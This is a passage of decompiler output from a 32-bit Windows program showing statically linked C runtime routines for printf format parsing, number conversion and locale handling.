          *((_DWORD *)this + 11) = 6;
          break;
      }
      return 1;
    }
    v7 = (_BYTE *)*((_DWORD *)this + 4);
    if ( *v7 == 108 )
    {
      *((_DWORD *)this + 4) = v7 + 1;
      v8 = 4;
    }
    else
    {
      v8 = 3;
    }
    goto LABEL_44;
  }
  switch ( v1 )
  {
    case 'j':
      *((_DWORD *)this + 11) = 5;
      return 1;
    case 'I':
      v5 = (char *)*((_DWORD *)this + 4);
      v6 = *v5;
      if ( *v5 == 51 && v5[1] == 50 )
      {
        *((_DWORD *)this + 11) = 10;
        *((_DWORD *)this + 4) = v5 + 2;
      }
      else if ( v6 == 54 && v5[1] == 52 )
      {
        *((_DWORD *)this + 11) = 11;
        *((_DWORD *)this + 4) = v5 + 2;
      }
      else if ( v6 == 100 || v6 == 105 || v6 == 111 || v6 == 117 || v6 == 120 || v6 == 88 )
      {
        *((_DWORD *)this + 11) = 9;
      }
      return 1;
    case 'L':
      *((_DWORD *)this + 11) = 8;
      return 1;
    case 'T':
      *((_DWORD *)this + 11) = 13;
      return 1;
    case 'h':
      v3 = (_BYTE *)*((_DWORD *)this + 4);
      if ( *v3 == 104 )
      {
        *((_DWORD *)this + 4) = v3 + 1;
        v4 = 1;
LABEL_45:
        *((_DWORD *)this + 11) = v4;
        return 1;
      }
      v8 = 2;
LABEL_44:
      v4 = v8;
      goto LABEL_45;
  }
  return 1;
}

//----- (004135DB) --------------------------------------------------------
char __thiscall sub_4135DB(_DWORD *this)
{
  int v1; // edx
  _WORD *v3; // eax
  int v4; // eax
  unsigned __int16 *v5; // edx
  int v6; // eax
  _WORD *v7; // eax
  int v8; // [esp-4h] [ebp-8h]

  v1 = *((unsigned __int16 *)this + 25);
  if ( v1 == 70 )
  {
    if ( (*this & 8) == 0 )
    {
      this[7] = 7;
      return sub_413985((int)this);
    }
    return 1;
  }
  if ( v1 == 78 )
  {
    if ( (*this & 8) == 0 )
    {
      this[7] = 8;
LABEL_7:
      *_errno() = 22;
      _invalid_parameter_noinfo();
      return 0;
    }
    return 1;
  }
  if ( this[11] )
    goto LABEL_7;
  if ( (unsigned __int16)v1 > 0x6Au )
  {
    if ( (_WORD)v1 != 108 )
    {
      switch ( v1 )
      {
        case 't':
          this[11] = 7;
          break;
        case 'w':
          this[11] = 12;
          break;
        case 'z':
          this[11] = 6;
          break;
      }
      return 1;
    }
    v7 = (_WORD *)this[4];
    if ( *v7 == 108 )
    {
      this[4] = v7 + 1;
      v8 = 4;
    }
    else
    {
      v8 = 3;
    }
    goto LABEL_44;
  }
  if ( (_WORD)v1 == 106 )
  {
    this[11] = 5;
    return 1;
  }
  switch ( v1 )
  {
    case 'I':
      v5 = (unsigned __int16 *)this[4];
      v6 = *v5;
      if ( v6 == 51 && v5[1] == 50 )
      {
        this[11] = 10;
        this[4] = v5 + 2;
      }
      else if ( v6 == 54 && v5[1] == 52 )
      {
        this[11] = 11;
        this[4] = v5 + 2;
      }
      else if ( v6 == 100 || v6 == 105 || v6 == 111 || v6 == 117 || v6 == 120 || v6 == 88 )
      {
        this[11] = 9;
      }
      return 1;
    case 'L':
      this[11] = 8;
      return 1;
    case 'T':
      this[11] = 13;
      return 1;
  }
  if ( *((_WORD *)this + 25) == 104 )
  {
    v3 = (_WORD *)this[4];
    if ( *v3 == 104 )
    {
      this[4] = v3 + 1;
      v4 = 1;
LABEL_45:
      this[11] = v4;
      return 1;
    }
    v8 = 2;
LABEL_44:
    v4 = v8;
    goto LABEL_45;
  }
  return 1;
}

//----- (00413753) --------------------------------------------------------
char __thiscall sub_413753(int this)
{
  int v2; // eax
  char v3; // al
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // ecx
  int v10; // ebx
  char v11; // dl
  bool v12; // bl
  bool v13; // al
  char v14; // al
  int v15; // edi
  char v16; // [esp-4h] [ebp-14h]
  int v17; // [esp+8h] [ebp-8h]
  __int16 Src; // [esp+Ch] [ebp-4h] BYREF
  char v19; // [esp+Eh] [ebp-2h]

  v2 = *(char *)(this + 49);
  if ( v2 <= 100 )
  {
    if ( v2 != 100 )
    {
      if ( v2 > 88 )
      {
        v5 = v2 - 90;
        if ( !v5 )
        {
          v3 = unknown_libname_17(this);
          goto LABEL_11;
        }
        v6 = v5 - 7;
        if ( !v6 )
          goto LABEL_31;
        if ( v6 != 2 )
          return 0;
        goto LABEL_18;
      }
      if ( v2 != 88 )
      {
        if ( v2 != 65 )
        {
          if ( v2 != 67 )
          {
            if ( v2 <= 68 )
              return 0;
            if ( v2 > 71 )
            {
              if ( v2 == 83 )
              {
LABEL_10:
                v3 = unknown_libname_23(this);
                goto LABEL_11;
              }
              return 0;
            }
            goto LABEL_31;
          }
LABEL_18:
          v3 = unknown_libname_20(0);
          goto LABEL_11;
        }
LABEL_31:
        v3 = unknown_libname_19(this);
        goto LABEL_11;
      }
      v16 = 1;
LABEL_14:
      v3 = sub_414131(this, 16, v16);
      goto LABEL_11;
    }
    goto LABEL_28;
  }
  if ( v2 > 112 )
  {
    v7 = v2 - 115;
    if ( !v7 )
      goto LABEL_10;
    v8 = v7 - 2;
    if ( v8 )
    {
      if ( v8 != 3 )
        return 0;
      v16 = 0;
      goto LABEL_14;
    }
    goto LABEL_29;
  }
  if ( v2 == 112 )
  {
    v3 = sub_414489((_DWORD *)this);
    goto LABEL_11;
  }
  if ( v2 <= 103 )
    goto LABEL_31;
  switch ( v2 )
  {
    case 'i':
LABEL_28:
      *(_DWORD *)(this + 32) |= 0x10u;
LABEL_29:
      v3 = sub_414131(this, 10, 0);
      break;
    case 'n':
      v3 = unknown_libname_22(this);
      break;
    case 'o':
      v3 = sub_41444B((_DWORD *)this);
      break;
    default:
      return 0;
  }
LABEL_11:
  if ( !v3 )
    return 0;
  if ( !*(_BYTE *)(this + 48) )
  {
    v9 = 0;
    Src = 0;
    v19 = 0;
    v10 = *(_DWORD *)(this + 32);
    v17 = 0;
    if ( (v10 & 0x10) != 0 )
    {
      if ( (v10 & 0x40) != 0 )
      {
        LOBYTE(Src) = 45;
      }
      else
      {
        if ( (v10 & 1) == 0 )
        {
          if ( (v10 & 2) != 0 )
          {
            LOBYTE(Src) = 32;
            v9 = 1;
            v17 = 1;
          }
          goto LABEL_46;
        }
        LOBYTE(Src) = 43;
      }
      v9 = 1;
      v17 = 1;
    }
LABEL_46:
    v11 = *(_BYTE *)(this + 49);
    v12 = (v11 == 120 || v11 == 88) && (v10 & 0x20) != 0;
    v13 = v11 == 97 || v11 == 65;
    if ( v12 || v13 )
    {
      *((_BYTE *)&Src + v9) = 48;
      if ( v11 == 88 || v11 == 65 )
        v14 = 88;
      else
        v14 = 120;
      *((_BYTE *)&Src + v9 + 1) = v14;
      v9 += 2;
      v17 = v9;
    }
    v15 = *(_DWORD *)(this + 36) - *(_DWORD *)(this + 56) - v9;
    if ( (*(_BYTE *)(this + 32) & 0xC) == 0 )
    {
      __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(
        this + 1096,
        32,
        v15,
        this + 24);
      v9 = v17;
    }
    unknown_libname_28(&Src, v9, this + 24, this + 12);
    if ( (*(_DWORD *)(this + 32) & 8) != 0 && (*(_DWORD *)(this + 32) & 4) == 0 )
      __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(
        this + 1096,
        48,
        v15,
        this + 24);
    unknown_libname_26(0);
    if ( *(int *)(this + 24) >= 0 && (*(_DWORD *)(this + 32) & 4) != 0 )
      __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(
        this + 1096,
        32,
        v15,
        this + 24);
  }
  return 1;
}
// 412C41: using guessed type _DWORD __cdecl __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(_DWORD, _DWORD, _DWORD, _DWORD);
// 413C9C: using guessed type int __thiscall unknown_libname_17(_DWORD);
// 413D50: using guessed type int __thiscall unknown_libname_19(_DWORD);
// 414008: using guessed type _DWORD __stdcall unknown_libname_20(_DWORD);
// 4143D7: using guessed type int __thiscall unknown_libname_22(_DWORD);
// 4144B9: using guessed type int __thiscall unknown_libname_23(_DWORD);
// 414686: using guessed type _DWORD __stdcall unknown_libname_26(_DWORD);

//----- (00413985) --------------------------------------------------------
char __thiscall sub_413985(int this)
{
  unsigned int v2; // eax
  char v3; // al
  unsigned int v5; // eax
  unsigned int v6; // eax
  unsigned int v7; // eax
  unsigned int v8; // eax
  int v9; // ecx
  int v10; // ebx
  int v11; // edx
  __int16 v12; // di
  bool v13; // bl
  bool v14; // al
  int v15; // ebx
  __int16 v16; // [esp-8h] [ebp-24h]
  char v17; // [esp-4h] [ebp-20h]
  int v18; // [esp+Ch] [ebp-10h]
  int Src; // [esp+10h] [ebp-Ch] BYREF
  __int16 v20; // [esp+14h] [ebp-8h]

  v2 = *(unsigned __int16 *)(this + 50);
  if ( v2 <= 0x64 )
  {
    if ( v2 != 100 )
    {
      if ( v2 > 0x58 )
      {
        v5 = v2 - 90;
        if ( !v5 )
        {
          v3 = unknown_libname_18(this, 65);
          goto LABEL_11;
        }
        v6 = v5 - 7;
        if ( !v6 )
          goto LABEL_31;
        if ( v6 != 2 )
          return 0;
        goto LABEL_18;
      }
      if ( v2 != 88 )
      {
        if ( v2 != 65 )
        {
          if ( v2 != 67 )
          {
            if ( v2 <= 0x44 )
              return 0;
            if ( v2 > 0x47 )
            {
              if ( v2 == 83 )
              {
LABEL_10:
                v3 = sub_41452A((_DWORD *)this);
                goto LABEL_11;
              }
              return 0;
            }
            goto LABEL_31;
          }
LABEL_18:
          v3 = unknown_libname_21(0);
          goto LABEL_11;
        }
LABEL_31:
        v3 = sub_413EA1(this, 65);
        goto LABEL_11;
      }
      v17 = 1;
LABEL_14:
      v3 = sub_414282(this, 16, v17);
      goto LABEL_11;
    }
    goto LABEL_28;
  }
  if ( v2 > 0x70 )
  {
    v7 = v2 - 115;
    if ( !v7 )
      goto LABEL_10;
    v8 = v7 - 2;
    if ( v8 )
    {
      if ( v8 != 3 )
        return 0;
      v17 = 0;
      goto LABEL_14;
    }
    goto LABEL_29;
  }
  if ( v2 == 112 )
  {
    v3 = sub_4144A1((_DWORD *)this);
    goto LABEL_11;
  }
  if ( v2 <= 0x67 )
    goto LABEL_31;
  switch ( v2 )
  {
    case 'i':
LABEL_28:
      *(_DWORD *)(this + 32) |= 0x10u;
LABEL_29:
      v3 = sub_414282(this, 10, 0);
      break;
    case 'n':
      v3 = unknown_libname_22(this);
      break;
    case 'o':
      v3 = sub_41446A((_DWORD *)this);
      break;
    default:
      return 0;
  }
LABEL_11:
  if ( !v3 )
    return 0;
  if ( !*(_BYTE *)(this + 48) )
  {
    v9 = 0;
    Src = 0;
    v20 = 0;
    v10 = *(_DWORD *)(this + 32);
    v18 = 0;
    if ( (v10 & 0x10) != 0 )
    {
      if ( (v10 & 0x40) != 0 )
      {
        v16 = 45;
      }
      else
      {
        if ( (v10 & 1) == 0 )
        {
          if ( (v10 & 2) != 0 )
          {
            LOWORD(Src) = 32;
            v9 = 1;
            v18 = 1;
          }
          goto LABEL_46;
        }
        v16 = 43;
      }
      v9 = 1;
      LOWORD(Src) = v16;
      v18 = 1;
    }
LABEL_46:
    v11 = *(unsigned __int16 *)(this + 50);
    v12 = 120;
    v13 = ((_WORD)v11 == 120 || (_WORD)v11 == 88) && (v10 & 0x20) != 0;
    v14 = v11 == 97 || (_WORD)v11 == 65;
    if ( v13 || v14 )
    {
      *((_WORD *)&Src + v9) = 48;
      if ( (_WORD)v11 == 88 || (_WORD)v11 == 65 )
        v12 = 88;
      *((_WORD *)&Src + v9 + 1) = v12;
      v9 += 2;
      v18 = v9;
    }
    v15 = *(_DWORD *)(this + 36) - *(_DWORD *)(this + 56) - v9;
    if ( (*(_BYTE *)(this + 32) & 0xC) == 0 )
    {
      __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<wchar_t>,char>(
        this + 1096,
        32,
        v15,
        this + 24);
      v9 = v18;
    }
    unknown_libname_29(&Src, v9, this + 24, this + 12);
    if ( (*(_DWORD *)(this + 32) & 8) != 0 && (*(_DWORD *)(this + 32) & 4) == 0 )
      __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<wchar_t>,char>(
        this + 1096,
        48,
        v15,
        this + 24);
    unknown_libname_27(0);
    if ( *(int *)(this + 24) >= 0 && (*(_DWORD *)(this + 32) & 4) != 0 )
      __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<wchar_t>,char>(
        this + 1096,
        32,
        v15,
        this + 24);
  }
  return 1;
}
// 412C6D: using guessed type _DWORD __cdecl __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<wchar_t>,char>(_DWORD, char, _DWORD, _DWORD);
// 413CF6: using guessed type int __fastcall unknown_libname_18(_DWORD, _DWORD);
// 413EA1: using guessed type int __fastcall sub_413EA1(_DWORD, _DWORD);
// 41409B: using guessed type _DWORD __stdcall unknown_libname_21(_DWORD);
// 4143D7: using guessed type int __thiscall unknown_libname_22(_DWORD);
// 41472B: using guessed type _DWORD __stdcall unknown_libname_27(_DWORD);

//----- (00413BE2) --------------------------------------------------------
char __thiscall sub_413BE2(int this)
{
  int *v1; // edx
  int v3; // eax

  v1 = (int *)(this + 36);
  if ( *(_BYTE *)(this + 49) != 42 )
    return unknown_libname_12(this + 36);
  *(_DWORD *)(this + 20) += 4;
  v3 = *(_DWORD *)(*(_DWORD *)(this + 20) - 4);
  *v1 = v3;
  if ( v3 < 0 )
  {
    *(_DWORD *)(this + 32) |= 4u;
    *v1 = -v3;
  }
  return 1;
}
// 412FC5: using guessed type _DWORD __stdcall unknown_libname_12(_DWORD);

//----- (00413C0D) --------------------------------------------------------
char __thiscall sub_413C0D(int this)
{
  int *v1; // edx
  int v3; // eax

  v1 = (int *)(this + 36);
  if ( *(_WORD *)(this + 50) != 42 )
    return sub_413039(this + 36);
  *(_DWORD *)(this + 20) += 4;
  v3 = *(_DWORD *)(*(_DWORD *)(this + 20) - 4);
  *v1 = v3;
  if ( v3 < 0 )
  {
    *(_DWORD *)(this + 32) |= 4u;
    *v1 = -v3;
  }
  return 1;
}
// 413039: using guessed type _DWORD __stdcall sub_413039(_DWORD);

//----- (00414131) --------------------------------------------------------
char __thiscall sub_414131(int this, int a2, char a3)
{
  int v4; // eax
  int v6; // eax
  int v7; // edi
  int v8; // ebx
  int v9; // eax
  bool v10; // zf
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // eax
  int v17; // ecx
  int v18; // [esp-4h] [ebp-14h]
  int v19; // [esp+Ch] [ebp-4h]

  v4 = __crt_stdio_output::to_integer_size(*(_DWORD *)(this + 44));
  v19 = v4;
  switch ( v4 )
  {
    case 1:
      v15 = *(_DWORD *)(this + 32);
      *(_DWORD *)(this + 20) += 4;
      v10 = (v15 & 0x10) == 0;
      v16 = *(_DWORD *)(this + 20);
      if ( v10 )
        v12 = *(unsigned __int8 *)(v16 - 4);
      else
        v12 = *(char *)(v16 - 4);
      goto LABEL_16;
    case 2:
      v13 = *(_DWORD *)(this + 32);
      *(_DWORD *)(this + 20) += 4;
      v10 = (v13 & 0x10) == 0;
      v14 = *(_DWORD *)(this + 20);
      if ( v10 )
        v12 = *(unsigned __int16 *)(v14 - 4);
      else
        v12 = *(__int16 *)(v14 - 4);
LABEL_16:
      v8 = v12 >> 31;
      v7 = v12;
      goto LABEL_17;
    case 4:
      v9 = *(_DWORD *)(this + 32);
      *(_DWORD *)(this + 20) += 4;
      v10 = (v9 & 0x10) == 0;
      v11 = *(_DWORD *)(this + 20);
      if ( v10 )
      {
        v7 = *(_DWORD *)(v11 - 4);
        v8 = 0;
        goto LABEL_17;
      }
      v12 = *(_DWORD *)(v11 - 4);
      goto LABEL_16;
  }
  if ( v4 != 8 )
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 0;
  }
  *(_DWORD *)(this + 20) += 8;
  v6 = *(_DWORD *)(this + 20);
  v7 = *(_DWORD *)(v6 - 8);
  v8 = *(_DWORD *)(v6 - 4);
LABEL_17:
  v17 = *(_DWORD *)(this + 32);
  if ( (v17 & 0x10) != 0 && v8 < 0 )
  {
    v7 = -v7;
    v8 = (unsigned __int64)-__SPAIR64__(v8, v7) >> 32;
    v17 |= 0x40u;
    *(_DWORD *)(this + 32) = v17;
  }
  if ( *(int *)(this + 40) >= 0 )
  {
    v18 = *(_DWORD *)(this + 40);
    *(_DWORD *)(this + 32) = v17 & 0xFFFFFFF7;
    __crt_stdio_output::formatting_buffer::ensure_buffer_is_big_enough<char>(v18);
  }
  else
  {
    *(_DWORD *)(this + 40) = 1;
  }
  if ( !(v8 | v7) )
    *(_DWORD *)(this + 32) &= ~0x20u;
  *(_BYTE *)(this + 60) = 0;
  if ( v19 == 8 )
    unknown_libname_6(v7, v8, a2, a3);
  else
    unknown_libname_4(v7, a2, a3);
  if ( (*(_DWORD *)(this + 32) & 0x80) != 0 && (!*(_DWORD *)(this + 56) || **(_BYTE **)(this + 52) != 48) )
  {
    *(_BYTE *)--*(_DWORD *)(this + 52) = 48;
    ++*(_DWORD *)(this + 56);
  }
  return 1;
}
// 41287F: using guessed type _DWORD __stdcall __crt_stdio_output::formatting_buffer::ensure_buffer_is_big_enough<char>(_DWORD);
// 412A17: using guessed type _DWORD __stdcall unknown_libname_4(_DWORD, _DWORD, char);
// 412B11: using guessed type _DWORD __stdcall unknown_libname_6(_DWORD, _DWORD, _DWORD, char);
// 413C40: using guessed type int __cdecl __crt_stdio_output::to_integer_size(_DWORD);

//----- (00414282) --------------------------------------------------------
char __thiscall sub_414282(int this, int a2, char a3)
{
  int v4; // eax
  int v6; // eax
  int v7; // edi
  int v8; // ebx
  int v9; // eax
  bool v10; // zf
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // eax
  int v17; // ecx
  int v18; // [esp-4h] [ebp-14h]
  int v19; // [esp+Ch] [ebp-4h]

  v4 = __crt_stdio_output::to_integer_size(*(_DWORD *)(this + 44));
  v19 = v4;
  switch ( v4 )
  {
    case 1:
      v15 = *(_DWORD *)(this + 32);
      *(_DWORD *)(this + 20) += 4;
      v10 = (v15 & 0x10) == 0;
      v16 = *(_DWORD *)(this + 20);
      if ( v10 )
        v12 = *(unsigned __int8 *)(v16 - 4);
      else
        v12 = *(char *)(v16 - 4);
      goto LABEL_16;
    case 2:
      v13 = *(_DWORD *)(this + 32);
      *(_DWORD *)(this + 20) += 4;
      v10 = (v13 & 0x10) == 0;
      v14 = *(_DWORD *)(this + 20);
      if ( v10 )
        v12 = *(unsigned __int16 *)(v14 - 4);
      else
        v12 = *(__int16 *)(v14 - 4);
LABEL_16:
      v8 = v12 >> 31;
      v7 = v12;
      goto LABEL_17;
    case 4:
      v9 = *(_DWORD *)(this + 32);
      *(_DWORD *)(this + 20) += 4;
      v10 = (v9 & 0x10) == 0;
      v11 = *(_DWORD *)(this + 20);
      if ( v10 )
      {
        v7 = *(_DWORD *)(v11 - 4);
        v8 = 0;
        goto LABEL_17;
      }
      v12 = *(_DWORD *)(v11 - 4);
      goto LABEL_16;
  }
  if ( v4 != 8 )
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 0;
  }
  *(_DWORD *)(this + 20) += 8;
  v6 = *(_DWORD *)(this + 20);
  v7 = *(_DWORD *)(v6 - 8);
  v8 = *(_DWORD *)(v6 - 4);
LABEL_17:
  v17 = *(_DWORD *)(this + 32);
  if ( (v17 & 0x10) != 0 && v8 < 0 )
  {
    v7 = -v7;
    v8 = (unsigned __int64)-__SPAIR64__(v8, v7) >> 32;
    v17 |= 0x40u;
    *(_DWORD *)(this + 32) = v17;
  }
  if ( *(int *)(this + 40) >= 0 )
  {
    v18 = *(_DWORD *)(this + 40);
    *(_DWORD *)(this + 32) = v17 & 0xFFFFFFF7;
    __crt_stdio_output::formatting_buffer::ensure_buffer_is_big_enough<wchar_t>(v18);
  }
  else
  {
    *(_DWORD *)(this + 40) = 1;
  }
  if ( !(v8 | v7) )
    *(_DWORD *)(this + 32) &= ~0x20u;
  *(_BYTE *)(this + 60) = 1;
  if ( v19 == 8 )
    sub_412B9F(v7, v8, a2, a3);
  else
    unknown_libname_5(v7, a2, a3);
  if ( (*(_DWORD *)(this + 32) & 0x80) != 0 && (!*(_DWORD *)(this + 56) || **(_WORD **)(this + 52) != 48) )
  {
    *(_DWORD *)(this + 52) -= 2;
    **(_WORD **)(this + 52) = 48;
    ++*(_DWORD *)(this + 56);
  }
  return 1;
}
// 4128FC: using guessed type _DWORD __stdcall __crt_stdio_output::formatting_buffer::ensure_buffer_is_big_enough<wchar_t>(_DWORD);
// 412A8A: using guessed type _DWORD __stdcall unknown_libname_5(_DWORD, _DWORD, char);
// 412B9F: using guessed type _DWORD __stdcall sub_412B9F(_DWORD, _DWORD, _DWORD, char);
// 413C40: using guessed type int __cdecl __crt_stdio_output::to_integer_size(_DWORD);

//----- (0041444B) --------------------------------------------------------
char __thiscall sub_41444B(_DWORD *this)
{
  if ( (this[8] & 0x20) != 0 )
    this[8] |= 0x80u;
  return sub_414131((int)this, 8, 0);
}

//----- (0041446A) --------------------------------------------------------
char __thiscall sub_41446A(_DWORD *this)
{
  if ( (this[8] & 0x20) != 0 )
    this[8] |= 0x80u;
  return sub_414282((int)this, 8, 0);
}

//----- (00414489) --------------------------------------------------------
char __thiscall sub_414489(_DWORD *this)
{
  this[10] = 8;
  this[11] = 10;
  return sub_414131((int)this, 16, 1);
}

//----- (004144A1) --------------------------------------------------------
char __thiscall sub_4144A1(_DWORD *this)
{
  this[10] = 8;
  this[11] = 10;
  return sub_414282((int)this, 16, 1);
}

//----- (0041452A) --------------------------------------------------------
char __thiscall sub_41452A(_DWORD *this)
{
  size_t v2; // ebx
  const wchar_t *v3; // edi
  size_t v4; // eax

  this[5] += 4;
  v2 = this[10];
  v3 = *(const wchar_t **)(this[5] - 4);
  this[13] = v3;
  if ( v2 == -1 )
    v2 = 0x7FFFFFFF;
  if ( (unsigned __int8)__crt_stdio_output::is_wide_character_specifier<wchar_t>(
                          *this,
                          this[1],
                          *((_WORD *)this + 25),
                          this[11]) )
  {
    if ( !v3 )
    {
      v3 = L"(null)";
      this[13] = L"(null)";
    }
    *((_BYTE *)this + 60) = 1;
    v4 = wcsnlen(v3, v2);
  }
  else
  {
    if ( !v3 )
      this[13] = "(null)";
    v4 = unknown_libname_24(v2, 0);
  }
  this[14] = v4;
  return 1;
}
// 4129AB: using guessed type _DWORD __cdecl __crt_stdio_output::is_wide_character_specifier<wchar_t>(_DWORD, _DWORD, __int16, _DWORD);
// 41459D: using guessed type _DWORD __stdcall unknown_libname_24(_DWORD, _DWORD);
// 425340: using guessed type wchar_t aNull_1[7];

//----- (004148B2) --------------------------------------------------------
int __cdecl sub_4148B2(int a1, int a2, int *a3, int a4, int a5, struct __crt_locale_pointers *a6, int a7)
{
  return sub_412549(a1, a2, a3, a4, a5, a6, a7);
}

//----- (004148D6) --------------------------------------------------------
int __cdecl sub_4148D6(int a1, int a2, int *a3, int a4, int a5, struct __crt_locale_pointers *a6, int a7)
{
  return sub_4126C7(a1, a2, a3, a4, a5, a6, a7);
}

//----- (0041498D) --------------------------------------------------------
double __cdecl sub_41498D(int a1, _DWORD *a2, struct __crt_locale_pointers *a3)
{
  double result; // st7
  int v4; // ecx
  int v5; // eax
  int v6; // [esp-Ch] [ebp-30h] BYREF
  int v7; // [esp-8h] [ebp-2Ch]
  int *v8; // [esp-4h] [ebp-28h]
  int v9; // [esp+8h] [ebp-1Ch] BYREF
  struct localeinfo_struct Locale; // [esp+Ch] [ebp-18h] BYREF
  char v11; // [esp+14h] [ebp-10h]
  double v12; // [esp+18h] [ebp-Ch] BYREF

  if ( a2 )
    *a2 = a1;
  if ( a1 )
  {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v9, a3);
    v8 = (int *)&v12;
    v7 = v4;
    v6 = v4;
    v12 = 0.0;
    unknown_libname_30(&v6, a1, a2);
    v5 = __crt_strtox::parse_floating_point<__crt_strtox::c_string_character_source<char>,_LDBL12>(
           &Locale,
           v6,
           v7,
           (int)v8);
    if ( v5 == 3 || v5 == 2 )
      *_errno() = 34;
    result = v12;
    if ( v11 )
      *(_DWORD *)(v9 + 848) &= ~2u;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 0.0;
  }
  return result;
}
// 4149CC: variable 'v4' is possibly undefined
// 414A58: using guessed type _DWORD __cdecl unknown_libname_30(_DWORD, _DWORD, _DWORD);
// 41498D: using guessed type double var_C;

//----- (00417B5B) --------------------------------------------------------
void __cdecl sub_417B5B(int a1, _DWORD *a2)
{
  sub_41498D(a1, a2, 0);
}

//----- (00417EAA) --------------------------------------------------------
int __cdecl sub_417EAA(int a1)
{
  int result; // eax

  result = a1;
  dword_43011C = a1;
  return result;
}
// 43011C: using guessed type int dword_43011C;

//----- (0041809A) --------------------------------------------------------
int sub_41809A()
{
  return dword_430120;
}
// 430120: using guessed type int dword_430120;

//----- (004180A0) --------------------------------------------------------
int __cdecl sub_4180A0(int a1)
{
  int result; // eax

  result = a1;
  dword_430120 = a1;
  return result;
}
// 430120: using guessed type int dword_430120;

//----- (004180E6) --------------------------------------------------------
int __cdecl sub_4180E6(int a1)
{
  int result; // eax

  result = a1;
  dword_430124 = a1;
  return result;
}
// 430124: using guessed type int dword_430124;

//----- (0041860C) --------------------------------------------------------
void *__cdecl sub_41860C(void **a1)
{
  void *result; // eax

  result = *a1;
  if ( *a1 != dword_430340 )
    return (void *)unknown_libname_32(*a1);
  return result;
}

//----- (00418627) --------------------------------------------------------
void *__cdecl sub_418627(void **a1)
{
  void *result; // eax

  result = *a1;
  if ( *a1 != dword_43033C )
    return (void *)unknown_libname_32(*a1);
  return result;
}

//----- (0041896E) --------------------------------------------------------
int __cdecl sub_41896E(int a1)
{
  int result; // eax

  result = a1;
  dword_43034C = a1;
  return result;
}
// 43034C: using guessed type int dword_43034C;

//----- (00418A98) --------------------------------------------------------
__int32 sub_418A98()
{
  return _InterlockedExchange(&dword_430354, 1);
}
// 430354: using guessed type int dword_430354;

//----- (00418B2C) --------------------------------------------------------
int sub_418B2C()
{
  return dword_430358;
}
// 430358: using guessed type int dword_430358;

//----- (00418B62) --------------------------------------------------------
void *sub_418B62()
{
  return &unk_43035C;
}

//----- (00418B68) --------------------------------------------------------
int __stdcall sub_418B68(_DWORD *a1, int a2, _DWORD *a3)
{
  int v4; // [esp+10h] [ebp-1Ch]

  __acrt_lock(*a1);
  v4 = _lambda_f03950bc5685219e0bcd2087efbe011e_::operator()(a2);
  __acrt_unlock(*a3);
  return v4;
}
// 418D47: using guessed type int __thiscall _lambda_f03950bc5685219e0bcd2087efbe011e_::operator()(_DWORD);
// 41BC1C: using guessed type _DWORD __cdecl __acrt_lock(_DWORD);
// 41BC64: using guessed type _DWORD __cdecl __acrt_unlock(_DWORD);

//----- (00418BC3) --------------------------------------------------------
int __stdcall sub_418BC3(_DWORD *a1, int a2, _DWORD *a3)
{
  int v4; // [esp+10h] [ebp-1Ch]

  __acrt_lock(*a1);
  v4 = _lambda_22ebabd17bc4fa466a2aca6d8deb888d_::operator()(a2);
  __acrt_unlock(*a3);
  return v4;
}
// 418C1E: using guessed type int __thiscall _lambda_22ebabd17bc4fa466a2aca6d8deb888d_::operator()(_DWORD);
// 41BC1C: using guessed type _DWORD __cdecl __acrt_lock(_DWORD);
// 41BC64: using guessed type _DWORD __cdecl __acrt_unlock(_DWORD);

//----- (00418E21) --------------------------------------------------------
int __cdecl sub_418E21(_onexit_t Function)
{
  return _register_onexit_function(&stru_430360, Function);
}

//----- (00418EC0) --------------------------------------------------------
char sub_418EC0()
{
  dword_430398 = (struct __crt_locale_data *)&off_42F0F8;
  return 1;
}
// 42F0F8: using guessed type wchar_t *off_42F0F8;

//----- (00418EE7) --------------------------------------------------------
char sub_418EE7()
{
  __dcrt_uninitialize_environments_nolock();
  return 1;
}
// 418642: using guessed type int __dcrt_uninitialize_environments_nolock(void);

//----- (00418F1D) --------------------------------------------------------
__vcrt_bool sub_418F1D()
{
  return __vcrt_uninitialize(0);
}

//----- (00419B10) --------------------------------------------------------
int __cdecl sub_419B10(int a1)
{
  int result; // eax

  result = a1;
  dword_430378 = a1;
  return result;
}
// 430378: using guessed type int dword_430378;

//----- (0041A848) --------------------------------------------------------
struct __crt_locale_data *__cdecl sub_41A848(int a1, struct __crt_locale_data **a2)
{
  struct __crt_locale_data *result; // eax

  result = *a2;
  if ( *a2 != dword_430398 )
  {
    result = (struct __crt_locale_data *)dword_42F738;
    if ( (dword_42F738 & *(_DWORD *)(a1 + 848)) == 0 )
    {
      result = (struct __crt_locale_data *)__acrt_update_thread_locale_data();
      *a2 = result;
    }
  }
  return result;
}
// 41D57D: using guessed type int __acrt_update_thread_locale_data(void);
// 42F738: using guessed type int dword_42F738;

//----- (0041A875) --------------------------------------------------------
struct __crt_multibyte_data *__cdecl sub_41A875(int a1, struct __crt_multibyte_data **a2)
{
  struct __crt_multibyte_data *result; // eax

  result = *a2;
  if ( *a2 != dword_430704 )
  {
    result = (struct __crt_multibyte_data *)dword_42F738;
    if ( (dword_42F738 & *(_DWORD *)(a1 + 848)) == 0 )
    {
      result = sub_41C831();
      *a2 = result;
    }
  }
  return result;
}
// 42F738: using guessed type int dword_42F738;

//----- (0041B255) --------------------------------------------------------
int __cdecl sub_41B255(
        double *a1,
        char *Src,
        unsigned int a3,
        char *a4,
        unsigned int a5,
        int a6,
        size_t Size,
        char a8,
        int a9,
        int a10,
        struct __crt_locale_pointers *a11)
{
  struct __crt_locale_pointers *v12; // ebx
